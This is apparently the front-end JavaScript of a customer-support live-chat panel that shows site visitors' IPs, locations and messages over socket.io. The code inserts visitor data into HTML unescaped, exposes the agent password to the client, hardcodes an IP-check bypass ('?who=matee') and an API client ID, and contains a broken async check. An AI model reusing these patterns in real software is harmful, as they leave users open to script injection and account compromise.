
myUsers = {};
myChat = localStorage.getItem("myChat") ? JSON.parse(localStorage.getItem("myChat")) : {};
myRooms = localStorage.getItem("myRooms") ? JSON.parse(localStorage.getItem("myRooms")) : [];
currentUser = 0; // user with which chat is continue
me = window.csr;
typing = false;
timeout = null;
msg_tune = document.getElementById('msg_tune');

var tune = document.getElementById("notiVoice");
//if JQuery is Enabled
if(jQuery)
{
    $(document).ready(function(){
        console.log('chat work statdddd');
        try{
        document.getElementsByClassName('box-comments')[0].addEventListener("dragenter", abc, false);
        document.getElementsByClassName('box-comments')[0].addEventListener("dragleave", abc, false);
        document.getElementsByClassName('box-comments')[0].addEventListener("dragover", abc, false);
        document.getElementsByClassName('box-comments')[0].addEventListener("drop",function(e){
            handleUploadedFile(e, 1);
        });}
        catch
        {
            console.log('event listner failed to integrate');
        }

/*        if(sessionStorage.getItem("ip_status"))
        {
            window.ip_status = sessionStorage.getItem("ip_status");
        }
        else
            check_csr_ip(); */

        setTimeout(function(){
            if(window.ip_status == "black")
            {
                alert('Not Allowed to Work As Your IP is not White');
            }
            else
            {
                sessionStorage.setItem("ip_status", "white");
            }
        }, 3000)

        /*$('#csrPrivateChat').draggable({
            cursor: "crosshair",
            handle: ".box-header"
        }); */

        update_csr_info();

        $chatBox = $(".chatBoxLg");
        $msgArea = $(".boxComments");
        $msgBox = $("#msgBox");
        $csrs = $(".teamLevel");
        $visitorsTable = $("#example2");
        $unservedTable = $("#unserved");
        $msgForm = $("#msgForm");
        $userName = $(".chatBoxLg .username a");
        $userDesc = $(".chatBoxLg .description");
        $notifications = $(".notifications-menu");
        $msgMenu = $(".messages-menu");
        $userFrom = $("#contactForm");
        $userButtons = $(".user_buttons");
        $reqButton = $(".req_user_info");
        $uploadInput = $("#uploadInput");
        $uploadButton = $("#uploadButton");
        $typing = $(".typing");

        //socket = io('http://localhost:3000');
        socket = io('https://logxchat.com');

        socket.on('connect', function(){
            if(window.csr)
            {
                console.log(myRooms);
                socket.emit('csr', window.csr, myRooms);
                me = window.csr;
            }
        });

        socket.on('msg', msgObject => {
            console.log('msg Received');
            //first check if mobile user disappered from list
            if(!(msgObject.room in myUsers))
            {
                socket.emit('request_recon', msgObject.room);
            }

            if(document.location.href.indexOf('/chat') == -1)
            {
                console.log('msg in other pages');
                signal_in_other_pages();
                return;
            }

            playTune();
            if(currentUser == msgObject.room && $chatBox.is(':visible'))
                appendMsg(msgObject, 1);
            else if(currentUser == msgObject.room && $chatBox.is(':hidden'))
            {    show_counter(currentUser);
            }
            else if(myRooms.indexOf(msgObject.room) != -1)
            {
                show_counter(msgObject.room);
            }
            else
                blinkRow(msgObject.room);

            saveMsg(msgObject.room, msgObject);
        });

        socket.on('delivery_status', msgInfo => {
            console.log(msgInfo);
            if(msgInfo.msg_id == '*' && currentUser == msgInfo.room)
            {
                $("span.delivery_status:gt(-4)").html(`<i class="fa fa-fw fa-circle"></i>`);
                return;
            }
            try{
                myChat[msgInfo.room].forEach(function(msg, index, arr){
                    if(msg.msg_id && msg.msg_id == msgInfo.msg_id)
                        myChat[msgInfo.room][index].delivery_status = msgInfo.delivery_status;
                });
                localStorage.setItem("myChat", JSON.stringify(myChat));
            }
            catch(e){
                console.log('delivery status updation failed');
            }
            if(msgInfo.delivery_status == 'Delivered')
                $(`#${msgInfo.msg_id}`).html(`<i class="fa fa-fw fa-check-square"></i>`);
            else if(msgInfo.delivery_status == 'Read')
                $(`#${msgInfo.msg_id}`).html(`<i class="fa fa-fw fa-circle"></i>`);
        });

        socket.on('media', medObj => {
            console.log('media came');
            if(document.location.href.indexOf('/chat') == -1)
            {
                console.log('media Received in other pages');
                return;
            }
            playTune();
            if(currentUser == medObj.room && $chatBox.is(':visible'))
                appendMedia(medObj.file_name, medObj.file_type, medObj.from_name, 1, 0);
            else
                show_counter(medObj.room);

            saveMsg(medObj.room, medObj);
        });

        socket.on('csrs_visitors_list', (csrs, visitors) => {
            //myUsers = visitors;
            
            appendCSRS($csrs, csrs);
            appendVisitors($visitorsTable, $unservedTable, visitors);
        });

        socket.on('visitors', visitors => {
            console.log('visitrs link');
            appendVisitors($visitorsTable, $unservedTable, visitors);
        });

        socket.on('visitor_left', function(visitor){
            if(!visitor)
                return;

            delete myUsers[visitor.user_id];
            
            if(currentUser == visitor.user_id){
                setTimeout(function(){
                    if(!(visitor.user_id in myUsers))
                    {
                        if(currentUser == visitor.user_id)
                            $(".box-comments").append(`<kbd>${currentUser} Left the website</kbd>`);
                        update_my_rooms(visitor.user_id);
                        $("#"+visitor.user_id).remove();
                        $(".user_"+visitor.user_id).removeClass("bg-navy");
                        $(".user_"+visitor.user_id).addClass("btn_red");
                    }
                }, 10000);
            }
                
        });

        socket.on('csr_left', csr => {
            if(!csr)
                return;

            $("li[data-email='"+csr.agent_email+"']").remove();
        });

        socket.on('join_chat', (user, room) => function(){
            console.log('join chat by ', user, room);
            var noti = {room: room, msg_text: `${user.agent_name} joined the chat`, msg_type: 'notification'};
            setTimeout(function(){
                appendMsg(noti, 1);
            }, 1000);
            saveMsg(room, noti);
            var oldhtml = $("#"+room).find("td:eq(2)").text().trim();
            $("#"+room).find("td:eq(2)").text(oldhtml+' '+user.agent_name);
        });

        socket.on('leave_chat', (user, room) => function(){
            console.log('user left the chat');
            var noti = {msg_text: `${user.agent_name} left the chat`, msg_type: 'notification', room: room};
            appendMsg(noti, 1);
            saveMsg(room, noti);
            appendNoti(noti, 'notification');
/*
            var oldhtml = $("#"+room).find("td:eq(2)").text().trim();
            $("#"+room).find("td:eq(2)").text(oldhtml.replace(user.agent_name.trim(), "")); */
        });

        socket.on('already_signed', val => {
            /*
            if(val == 'logout')
            {
                $("#modal-default").modal();
                setTimeout(function(){
                    window.location = window.base_url+'/logout';
                }, 4000);
            }
            else if(val == 'stay')
            {
                $("#modal-default .modal-body").html(`<p class="text text-warning">We Just Restricted Your Login from another System. Please Be careful of Your Account Security</p>`);
                $("#modal-default .modal-footer a").remove();
                $("#modal-default").modal();
            } */
        });

        socket.on('bags_dels', function(nobj){
            playTune();
            $(".head_noti_counter_gen").show().text('1');
            msgg = nobj.product == 'bag' ? (nobj.bags_qty ? nobj.bags_qty : 0)+' Bag(s) Added by '+nobj.by_name : 'New Order by '+nobj.by_name;
            $(".notis_area").prepend(`<a title="${msgg}" href="${base_url}${nobj.product == 'bag' ? 'unassigned' : 'order'}" class="dropdown-item notify-item">
                                        <div class="notify-icon bg-primary">
                                            <i class="mdi mdi-comment-account-outline"></i>
                                        </div>
                                        <p class="notify-details">${msgg}
                                            <small class="text-muted">Just Now</small>
                                        </p>
                                    </a>`);
        });

        socket.on('csr_status', (usid, usatus) => {
            console.log(usid, usatus);
            if(usatus.toLowerCase() == 'online')
                $("ul.teamLevel li[data-email='"+usid+"']").find("i").removeClass('text-success text-warning text-danger').addClass('text-success');
            else if(usatus.toLowerCase() == 'offline')
                $("ul.teamLevel li[data-email='"+usid+"']").find("i").removeClass('text-success text-warning text-danger').addClass('text-danger');
            if(usatus.toLowerCase() == 'away')
                $("ul.teamLevel li[data-email='"+usid+"']").find("i").removeClass('text-success text-warning text-danger').addClass('text-warning');

        });

        socket.on('info_by_user', data => {
            console.log(data);
            if(data)
            {
                Object.keys(data).forEach(key => {
                    $(`input[name='${key}']`).val(data[key]);
                });
            }
        });

        socket.on('typing', tobj => {
            console.log(tobj);
            if(tobj.typing == true && currentUser == tobj.room)
            {
                $typing.show();
                $typing.html(`<i>${tobj.msg}</i>`);
                setTimeout(function(){
                    $typing.text('');
                    $typing.hide();
                }, 3000);
            }
        });


        //file upload 
        $uploadButton.click(function(){
            $uploadInput.click();
        });

        $uploadInput.change(function(e){
            handleUploadedFile(e, 0);
        });

        $msgForm.on('keyup', function(e){
            if(e.keyCode != 13)
            {
                if(typing == false){
                typing = true;
                socket.emit('typing', {room: currentUser, typing: true, msg: me.agent_name + ' is Typing'});
                clearTimeout(timeout);
                timeout = setTimeout(timeoutFunction, 2500);
                }
                else{
                    clearTimeout(timeout);
                    timeout = setTimeout(timeoutFunction, 2500);
                }
            }
        });

        function timeoutFunction(){
            typing = false;
        }

        $msgForm.submit(function(e){
            e.preventDefault();
            var msgid = "msg_"+makeid(6);
            myMsg = {msg_id: msgid, room: currentUser, msg_text: $msgBox.val(), from_name: me.agent_name, msg_time: new Date().toLocaleString('PK', {timeZone: 'Asia/Karachi'}), msg_type: 'msg', msg_from: me.agent_email, msg_to: myUsers[currentUser].user_email ? myUsers[currentUser].user_email : currentUser};
            appendMsg(myMsg, 1);
            saveMsg(currentUser, myMsg);
            socket.emit('msg', myMsg);
            $msgBox.val('');
        });

        $(".endChat").click(function(){
            if(!confirm("Do You Really Want to End Chat"))
                return;
            socket.emit('leave_chat', window.csr, currentUser, myUsers[currentUser].v_socket);
            delete_chat_button(currentUser);
            closeChatBox();

            /*var oldhtml = $("#"+currentUser).find("td:eq(2)").text().trim();
            $("#"+currentUser).find("td:eq(2)").text(oldhtml.replace(me.agent_name.trim(), ""));*/
            update_my_rooms(currentUser);
            moveDown(currentUser);
        });

        $(".minimize_chat").click(function(){
            closeChatBox();
        });


        //user meta data inputs
        $(".user_info").focus(function(){
            $(this).attr("readonly", false);
            $(this).attr("data-old", $(this).val());
        });

        $(".user_info").blur(function(){
            var nvalue = $(this).val();
            var ovalue = $(this).attr("data-old");
            $(this).attr("readonly", true);

            //in case of change in value
            if(ovalue != nvalue)
            {
                socket.emit("update_user_info", currentUser, $(this).attr("name"), nvalue);
                myUsers[currentUser][$(this).attr("name")] = nvalue;
            }
        });

        //get user info
        $reqButton.click(function(){
            socket.emit('req_info', currentUser);
        });

        //csr profile form submit
        $("#profileForm").submit(function(e){
            if(!validToSubmit())
                e.preventDefault();
        });

        //profile pic change
        $("input[name='cpic']").change(function(e){
            file = e.target.files[0];
            FReader = new FileReader();
            FReader.onload = function(evnt){
                $("#profilePic").attr("src", evnt.target.result);
                $("#profilePic").show();
            }
            FReader.readAsDataURL(file);
        });

        $("#selectStatus").change(function(){
            if($(this).val().length < 1)
                return;
            
            updateStatus($(this).val());
        });

    });

    $(document).on('click', '.visitorRow', function(e){
        $uid = $(this).attr("id");
        if(!($uid in myUsers))
            return;
        stopBlink($uid);
        /*let able = can_i_join($(this), $uid);
        if(!able){
            e.preventDefault();
            return false;
        } */ 
        OpenChatBox($uid);
        if(myRooms.indexOf($uid) == -1){
            socket.emit('join_chat', window.csr, $uid, myUsers[$uid].v_socket);
            myRooms.push($uid);
            localStorage.setItem("myRooms", JSON.stringify(myRooms));
            create_chat_button($uid);
            moveUp($uid);
        }
    });
    
}
else
    console.error('JQuery is Required to RUN the TCB Chat');
    
function OpenChatBox(uid)
{
    reset_counter(uid);
    currentUser = uid;
    $(".box-comments").empty();
    //if already in chat
    if(uid in myUsers)
    {
        $userName.text(`${myUsers[uid].user_name ? myUsers[uid].user_name : uid}`);
        $userDesc.text(`Online Since ${myUsers[uid].landing_time.substr(15)}`);
        //if prev chat exist
        if(uid in myChat)
        {
            myChat[uid].forEach(function(msg){
                appendMsg(msg, 0);
            });
        }

        $userFrom.find("input").val('');
        $userFrom.find("textarea").val('');

        //user details
        if('user_name' in myUsers[uid])
            $userFrom.find("input[name='user_name']").val(myUsers[uid]['user_name']);
        if('user_email' in myUsers[uid])
            $userFrom.find("input[name='user_email']").val(myUsers[uid]['user_email']);
        if('user_contact' in myUsers[uid])
            $userFrom.find("input[name='user_contact']").val(myUsers[uid]['user_contact']);
        if('user_notes' in myUsers[uid])
            $userFrom.find("textarea[name='user_notes']").val(myUsers[uid]['user_notes']);
        
        //append user general info
        appendUserInfo(myUsers[uid]);

    }
    $chatBox.show("fast", function(){
        $(".box-comments").animate({scrollTop: $('.box-comments').prop("scrollHeight")}, 500).promise().done(function(){
            if($chatBox.find(".box-body").is(':hidden'))
                $chatBox.find("button[data-widget='collapse']").click();
        });
        
    });

}

function closeChatBox()
{
    $chatBox.hide("fast");
}

function appendCSRS(el, list)
{
    var cUser;
    el.empty();
    Object.keys(list).forEach(function(key){
        cUser = list[key];
        el.append(`<li data-key="${key}" class="${cUser.agent_email == window.csr.agent_email ? 'me_csr' : 'the_csr'}" data-email="${cUser.agent_email}" data-csrname="${cUser.agent_name}"><a href="#"><i class="fa fa-circle text-success"></i> ${cUser.agent_name == window.csr.agent_name ? cUser.agent_name+'(me)' : cUser.agent_name}</a></li>`);
    });
}

function appendVisitors(el, el1, list)
{
    var vids = [];
    el.find("tbody").empty();
    el1.find("tbody").empty();
    var tbody = el.find("tbody");
    var tbody1 = el1.find("tbody");
    var cVisitor;
    var platform;
    
    Object.keys(list).forEach(function(key){
        
        if(vids.indexOf(list[key].user_id) > -1)
            return;
        
        cVisitor = list[key];
        cVisitor['v_socket'] = key;
        myUsers[cVisitor.user_id] = cVisitor;
        vids.push(cVisitor.user_id);
        platform = cVisitor.platform;
        platform = (platform.toLowerCase() == 'win32' || platform.toLowerCase() == 'win64') ? 'windows' : platform.toLowerCase();
        platform = platform.indexOf('iphone') > -1 || platform.indexOf('macintel') > -1 ? 'apple' : platform;
        iconHtml = cVisitor.icon ? '<img style="height:20px; width: 20px" src="'+cVisitor.icon+'" alt="ICON">' : '';
        served_by = '';
        if(cVisitor.served_by && cVisitor.served_by.length > 0)
        {
            cVisitor.served_by.forEach(function(servings){
                served_by += servings.split('_').shift() + " ";
            });
        
        served_by = getUniqueNames(served_by);
        tbody.append(`<tr class="visitorRow" id="${cVisitor.user_id}"> <td>#${cVisitor.user_name ? cVisitor.user_name : cVisitor.user_id}<span class="flag-icon flag-icon-${cVisitor.country ? cVisitor.country.toLowerCase() : 'usx'} flag-icon-squared" style="margin-left: 10px"></span><i class="fa fa-fw fa-${platform}"></i><i class="fa fa-fw fa-${cVisitor.browser.toLowerCase()}"></i></td> <td>${cVisitor.landing_time.substr(16,8)}</td> <td>${served_by}</td> <td title="${cVisitor.page}">${iconHtml} ${cVisitor.page.substr(0,30)}</td> <td title="${cVisitor.ref}">${cVisitor.ref.substr(0,30)}</td> <td>${cVisitor.visits}</td> <td>${cVisitor.chats}</td></tr>`);
        }
        else
        {
            tbody1.append(`<tr class="visitorRow" id="${cVisitor.user_id}"> <td>#${cVisitor.user_name ? cVisitor.user_name : cVisitor.user_id}<span class="flag-icon flag-icon-${cVisitor.country ? cVisitor.country.toLowerCase() : 'usx'} flag-icon-squared" style="margin-left: 10px"></span><i class="fa fa-fw fa-${platform}"></i><i class="fa fa-fw fa-${cVisitor.browser.toLowerCase()}"></i></td> <td>${cVisitor.landing_time.substr(16,8)}</td> <td title="${cVisitor.page}">${iconHtml} ${cVisitor.page.substr(0,45)}</td> <td title="${cVisitor.ref}">${cVisitor.ref.substr(0,30)}</td> <td>${cVisitor.visits}</td> <td>${cVisitor.chats}</td></tr>`);
        }
    });

    open_prev_chats();
    
}
function linkify(text) {
    var urlRegex = /(((https?:\/\/)|(www\.))[^\s]+)/g;
    return text.replace(urlRegex, function(url,b,c) {
        var url2 = (c == 'www.') ?  'http://' +url : url;
        return '<a href="' +url2+ '" target="_blank">' + url + '</a>';
    }) 
}

function appendMsg(msg, scroll)
{
    if(msg.msg_type == 'msg')
    {
        if(msg.delivery_status && msg.delivery_status == 'Read')
            mdsc = 'fa fa-fw fa-circle';
        else if(msg.delivery_status && msg.delivery_status == 'Delivered')
            mdsc = 'fa fa-fw fa-check-square';
        else
            mdsc = 'fa fa-fw fa-check';

        deliveryHTML = msg.room != msg.msg_from ? `<span class="delivery_status" id="${msg.msg_id}"><i class="${mdsc}"></i></span>` : ``;
        $(".box-comments").append(`<div class="comment-text"><span class="username">${msg.from_name}<span class="text-muted pull-right">${msg.msg_time} ${deliveryHTML}</span></span>${linkify(escapeHtml(msg.msg_text))}</div>`);
    }
    else if(msg.msg_type == 'media')
    {
        appendMedia(msg.file_name, msg.file_type, msg.from_name, 1, 0);
    }
    else if(msg.msg_type == 'notification')
    {
        if(msg.room == currentUser)
            $(".box-comments").append(`<kbd>${escapeHtml(msg.msg_text)}</kbd>`);
        else
            appendNoti(msg, msg.msg_type);
    }

    if(scroll == 1)
        $(".box-comments").animate({scrollTop: $('.box-comments').prop("scrollHeight")}, 500);
}


function saveMsg(room, msg)
{
    if(room in myChat)
    {
        myChat[room].push(msg);
    }
    else
    {
        myChat[room] = [];
        myChat[room].push(msg);
    }

    localStorage.setItem("myChat", JSON.stringify(myChat));

}

function appendNoti(msg, type)
{
    var nums = 0;
    if(type == 'msg' || type == 'media')
    {
        $msgMenu.find("ul.menu").prepend(`<li class="unread"><a href="#" class="notimsgs" onClick="openNotiMsgs(this)" data-room="${msg.room}"><div class="pull-left"><img src="/lte/dist/img/avatar5.png" class="img-circle" alt="User Image"></div><h4>${msg.from_name}<small><i class="fa fa-clock-o"></i>Just Now</small></h4><p>${type == 'msg' ?  escapeHtml(msg.msg_text.substr(0,35)) : 'File Received'}</p></a></li>`);

        nums = Number($msgMenu.find("span.label").text());
        nums++;
        $msgMenu.find("span.label").text(nums);
        $msgMenu.find("li.header").text(`You have ${nums} messages`);
    }
    else if(type == 'notification')
    {
        if(currentUser != msg.room)
        {
            $msgMenu.find("ul.menu").prepend(`<li class="unread"><a href="#" class="notimsgs" onClick="openNotiMsgs(this)" data-room="${msg.room}"><div class="pull-left"><img src="/lte/dist/img/avatar5.png" class="img-circle" alt="User Image"></div><h4>${msg.room}<small><i class="fa fa-clock-o"></i>Just Now</small></h4><p>${msg.msg_text}</p></a></li>`);

            var nums = $notifications.find("li.unread").length;
            $notifications.find("span.label").text(nums);
            $notifications.find("li.header").text(`You have ${nums} notifications`);

        }
    }
}

function blinkRow(rowId)
{
    $("#"+rowId).addClass("tcb_blink");
    setTimeout(function(){
        $("#"+rowId).removeClass("tcb_blink");
    }, 2000);
}

function stopBlink(rowId)
{
    $("#"+rowId).removeClass("tcb_blink");
}

function openNotiMsgs(el){
    $(el).parent().removeClass("unread");
    var roomId = $(el).attr("data-room");
    $msgMenu.find("span.label").text('0');
    if(myRooms.indexOf(roomId) == -1)
    {
        socket.emit('join_chat', window.csr, roomId, myUsers[roomId].v_socket);
        myRooms.push(roomId);
        localStorage.setItem("myRooms", JSON.stringify(myRooms));
        create_chat_button(roomId);
        moveUp(roomId);
        
        let oldhtml = $("#"+roomId).find("td:eq(2)").text().trim();
        $("#"+roomId).find("td:eq(2)").text(oldhtml+' '+window.csr.agent_name); 
    }
    OpenChatBox(roomId);
}

function appendUserInfo(user)
{
    $("#userInfo").empty();

    var userLocation = '';
        if('city' in user)
            userLocation += user['city'];
        if('region' in user)
            userLocation += ', '+user['region'];
        if('country' in user)
            userLocation += ', '+user['country'];
        if(userLocation != '')
            $("#userInfo").append(`<p><b>Location:</b> ${userLocation}</p>`);
        //browser
        $("#userInfo").append(`<p><b>Browser:</b> ${user['browser']}</p>`);
        //platform
        $("#userInfo").append(`<p><b>Platform:</b> ${user['platform']}</p>`);
        //ip
        if('ip' in user)
        $("#userInfo").append(`<p><b>IP:</b> ${user['ip']}</p>`);
        //Host
        $("#userInfo").append(`<p><b>Host Name:</b> ${user['host']}</p>`);
        //agent
        $("#userInfo").append(`<p><b>User Agent:</b> ${user['agent']}</p>`);
}

function create_chat_button(_user_id)
{
$userButtons.append(`<button data-user="${_user_id}" class="btn bg-navy user_button user_${_user_id}">${myUsers[_user_id].user_name ? myUsers[_user_id].user_name : '#'+myUsers[_user_id].user_id}<span class="badge closeChat" style="margin-left: 5px"><i class="fa fa-close"></i></span><span class="msg_counters" id="counter_${_user_id}">0</span></button>`);
}

function delete_chat_button(id)
{
    $(".user_"+id).remove();
}


function open_prev_chats()
{
    $userButtons.empty();
    myRooms.forEach(function(room){
        if(room in myUsers)
        {
            create_chat_button(room);
        }
    });
}

function update_my_rooms(cu)
{
    var ind = myRooms.indexOf(cu);
    if(ind > -1)
    {
        myRooms.splice(ind, 1);
        localStorage.setItem("myRooms", JSON.stringify(myRooms));
    }
}

function show_counter(user)
{
    $ex_counts = Number($("#counter_"+user).text());
    $ex_counts++;
    $("#counter_"+user).text($ex_counts);
    $("#counter_"+user).show();
}

function reset_counter(user)
{
    $("#counter_"+user).text('0');
    $("#counter_"+user).hide();
}


$(document).on('click', '.closeChat', function(e){
    e.stopPropagation();

    if(!confirm("Do You Really Want to End Chat"))
        return;

    var uid = $(this).parent().attr("data-user");
    if(uid == currentUser)
        $chatBox.hide("fast");  
    delete_chat_button(uid);
    if(uid in myUsers)
    {
        socket.emit('leave_chat', window.csr, uid, myUsers[uid].v_socket);
        moveDown(uid);
    }
    update_my_rooms(uid);
  });

  $(document).on('click', '.user_button', function(){
      var uid = $(this).attr("data-user");
      OpenChatBox(uid);
  });

  function playTune()
  {
    if(!tune)
        return;
    tune.pause();
    tune.play().catch(function(errrrr){
        console.log('tune play failed');
    });
  }

  function openProfileModal()
  {
      fill_CSR_Profile();
      $("#profileModal").modal();
  }

  function closeProfileModal()
  {
      $("#profileModal").modal('close');
  }

  function fill_CSR_Profile()
  {
      if(window.csr)
      {
          $("#csrname").val(window.csr.agent_name);
          $("#csremail").val(window.csr.agent_email);
          $("#csrext").val(window.csr.agent_ext ? window.csr.agent_ext : '');
      }
  }

  function validToSubmit()
  {
    if(window.csr.agent_password != $("#csrpass").val())
        return false;

    return true;
  }

  function update_csr_info()
  {
      if('agent_pic' in window.csr)
        $(".csr_image").attr("src", "//"+window.location.host+"/images/csr_images/"+window.csr.agent_pic);
  }

  function updateStatus(mystatus)
  {
    var olds = localStorage.getItem("my-status");
    if(olds != mystatus)
    {
        socket.emit('status_update', window.csr.agent_email, mystatus);
        localStorage.setItem("my-status", mystatus);
        if(mystatus.toLowerCase() == 'online')
            $(".statusShow").html(`<i class="fa fa-circle text-success"></i>Online`);
        else if(mystatus.toLowerCase() == 'offline')
            $(".statusShow").html(`<i class="fa fa-circle text-danger"></i>Offline`);
        else if(mystatus.toLowerCase() == 'away')
            $(".statusShow").html(`<i class="fa fa-circle text-warning"></i>Away`);
    }
  }

  function can_i_join($row, oid)
  {
      if((me.agent_role && me.agent_role.toLowerCase() == 'team lead') || myRooms.indexOf(oid) > -1 || $row.parent().parent().prop('id') == 'unserved')
        return  true;
      else if($row.find('td:eq(2)').html().indexOf(me.agent_name.trim()) > -1)
        return true;
      else
        return false;
  }

  function handleUploadedFile(_event, dragged)
  {
      if(dragged == 1)
      {
          file = _event.dataTransfer.files[0];
          _event.preventDefault();
          _event.target.style.backgroundColor = "#f7f7f7";
          $('.box-comments').css({'background-color': '#f7f7f7'});
      }
      else
        file = _event.target.files[0];

      if(file && file.type != null)
      {
          
          if(file.type.indexOf("pdf") > -1 || file.type.indexOf("html") > -1)
          {
              var fr = new FileReader();
              fr.onload = function(__e){
                  appendMedia(__e.target.result, file.type, me.agent_name, 0, 1);
              }

              fr.readAsDataURL(file);
          }
          else if(file.type.indexOf("image") > -1)
          {
              uploadImageToImgure(file);
          }
          else
          {
              alert("File Type Not Supported. Please Select Only Image, PDF and HTML Files");
          }
      }
  }

  function appendMedia(med, type, sr, link, emit)
  {
      if(type.indexOf("image") > -1)
        $(".box-comments").append(`<div class="comment-text"><span class="username">${sr}<span class="text-muted pull-right">${new Date().toLocaleString()}</span></span><img style="max-height:300px; max-width:200px" src="${med}"></div>`);
      else
      {
        var a = document.createElement("a");
        a.href = link == 0 ? med : 'https://logxchat.com/shared_images/'+med;
        a.target = "_blank";
        a.setAttribute("download", new Date().getTime());
        a.innerHTML = "Download File";
        $(".box-comments").append($(`<div class="comment-text"></div>`).append(`<span class="username">${sr}<span class="text-muted pull-right">${new Date().toLocaleString()}</span></span>`).append(a));
      }

      $(".box-comments").animate({scrollTop: $('.box-comments').prop("scrollHeight")}, 500);
      if(emit == 1){
      var ddt = new Date().getTime();
      var fname = ddt+'_'+currentUser+'.'+type.split('/').pop();
      var medObj = {room: currentUser, from_name: me.agent_name, msg_time: new Date().toLocaleString('PK', {timeZone: 'Asia/Karachi'}), msg_type: 'media', msg_to: myUsers[currentUser].user_email ? myUsers[currentUser].user_email : currentUser, msg_from: me.agent_email, file_name: fname, file_type: type};
      socket.emit('media', med, medObj);
      }
  }


  function escapeHtml(unsafe) {
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
  }

  async function checkIfValidIP(ip)
  {
    window.ip_status = 'black';
    $.get("https://logxchat.com/api/ips", function(ips){
        if(ips)
        {
            console.log(ip);
            ips.forEach(wip => {
                if(status == "white")
                    return;
                if(wip.ip == ip)
                {
                    console.log('matched');
                    window.ip_status = 'white';
                    sessionStorage.setItem("ip_status", "white");
                }
            });
        }
    });
  }




  function check_csr_ip()
  {
    $.get("https://ipinfo.io/json")
    .done(function(response){
        if(response.ip)
        {
            checkIfValidIP(response.ip).then(status => {
                if(status == "black" && document.location.search != "?who=matee")
                {
                    alert('Your IP is not allowed to run this panel. Plz Login over white IP');
                    $("body").fadeOut(1500, function(){
                        document.location = "/logout";
                    });
                }
            });
        }
    });
  }

  function uploadImageToImgure(file) {

    if (!file || !file.type.match(/image.*/)) return;
    var fd = new FormData(); 
    fd.append("image", file);
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.imgur.com/3/image.json");
    xhr.onload = function() {
    console.log('image uploaded');
    var uploadedImage = JSON.parse(xhr.responseText);
    console.log(uploadedImage);
    var medObj = {room: currentUser, from_name: me.agent_name, msg_time: new Date().toLocaleString('PK', {timeZone: 'Asia/Karachi'}), msg_type: 'media', msg_to: myUsers[currentUser].user_email ? myUsers[currentUser].user_email : currentUser, msg_from: me.agent_email, file_name: uploadedImage.data.link, file_type: file.type};
    if(uploadedImage.status == 200){
      socket.emit('media', uploadedImage.data.link, medObj);
      appendMedia(uploadedImage.data.link, file.type, "sender", 1, 0);
    }
    else
    {
        //deal the error
    }
    }

    xhr.setRequestHeader('Authorization', 'Client-ID 86afcd2fbeffbd5');
    xhr.send(fd);
}
function abc(e)
{
  e.preventDefault();
  $('.box-comments').css({'background-color': 'red'});
}

function moveUp($id)
{
    if($id in myUsers && $("#"+$id).parent().parent().prop('id') != 'example2')
    {
        var cVisitor = myUsers[$id];
        platform = cVisitor.platform;
        platform = (platform.toLowerCase() == 'win32' || platform.toLowerCase() == 'win64') ? 'windows' : platform.toLowerCase();
        platform = platform.indexOf('iphone') > -1 ? 'apple' : platform;
        iconHtml = cVisitor.icon ? '<img style="height:20px; width: 20px" src="'+cVisitor.icon+'" alt="ICON">' : '';
        $("#"+$id).remove(); 
        served_by = me.agent_name.trim();
        $visitorsTable.find("tbody").append(`<tr class="visitorRow" id="${cVisitor.user_id}"> <td>#${cVisitor.user_name ? cVisitor.user_name : cVisitor.user_id}<span class="flag-icon flag-icon-${cVisitor.country ? cVisitor.country.toLowerCase() : 'usx'} flag-icon-squared" style="margin-left: 10px"></span><i class="fa fa-fw fa-${platform}"></i><i class="fa fa-fw fa-${cVisitor.browser.toLowerCase()}"></i></td> <td>${cVisitor.landing_time.substr(16,8)}</td> <td>${served_by}</td> <td title="${cVisitor.page}">${iconHtml} ${cVisitor.page.substr(0,30)}</td> <td title="${cVisitor.ref}">${cVisitor.ref.substr(0,30)}</td> <td>${cVisitor.visits}</td> <td>${cVisitor.chats}</td></tr>`);
    }
    else if($id in myUsers)
    {
        console.log('working');
        $oldh = $("#"+$id).find("td:eq(2)").html();
        $("#"+$id).find("td:eq(2)").html(getUniqueNames($oldh +' '+ me.agent_name));
        console.log($("#"+$id).find("td:eq(2)").html());
    }
    
}

function moveDown($id)
{
    if($id in myUsers && $("#"+$id).find("td:eq(2)").html().trim() == me.agent_name.trim() && $("#"+$id).parent().parent().prop('id') == 'example2')
    {
        var cVisitor = myUsers[$id];
        platform = cVisitor.platform;
        platform = (platform.toLowerCase() == 'win32' || platform.toLowerCase() == 'win64') ? 'windows' : platform.toLowerCase();
        platform = platform.indexOf('iphone') > -1 ? 'apple' : platform;
        iconHtml = cVisitor.icon ? '<img style="height:20px; width: 20px" src="'+cVisitor.icon+'" alt="ICON">' : '';
        $("#"+$id).remove();
        $unservedTable.find("tbody").append(`<tr class="visitorRow" id="${cVisitor.user_id}"> <td>#${cVisitor.user_name ? cVisitor.user_name : cVisitor.user_id}<span class="flag-icon flag-icon-${cVisitor.country ? cVisitor.country.toLowerCase() : 'usx'} flag-icon-squared" style="margin-left: 10px"></span><i class="fa fa-fw fa-${platform}"></i><i class="fa fa-fw fa-${cVisitor.browser.toLowerCase()}"></i></td> <td>${cVisitor.landing_time.substr(16,8)}</td> <td title="${cVisitor.page}">${iconHtml} ${cVisitor.page.substr(0,30)}</td> <td title="${cVisitor.ref}">${cVisitor.ref.substr(0,30)}</td> <td>${cVisitor.visits}</td> <td>${cVisitor.chats}</td></tr>`);
    }
    else if($id in myUsers)
    {
        console.log('worked too');
        var newhtml = $("#"+$id).find("td:eq(2)").html().trim().replace(me.agent_name.trim(), '').trim();
        $("#"+$id).find("td:eq(2)").html(getUniqueNames(newhtml));
        console.log('new html'+newhtml);
    }
}

function getUniqueNames(str)
{
    var settled = str.trim().split(' ').filter(function(word, i, allwords){
        return i == allwords.indexOf(word);
    }).join(',');
    return settled;
}
function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }

 function signal_in_other_pages(msgObject)
 {
    msg_tune.play().catch(function(){
        msg_tune.play();
    });
    $(".head_noti_counter_chat").show();
    $(".msg_noti_area").append(`<a href="${base_url}chat" class="dropdown-item notify-item">
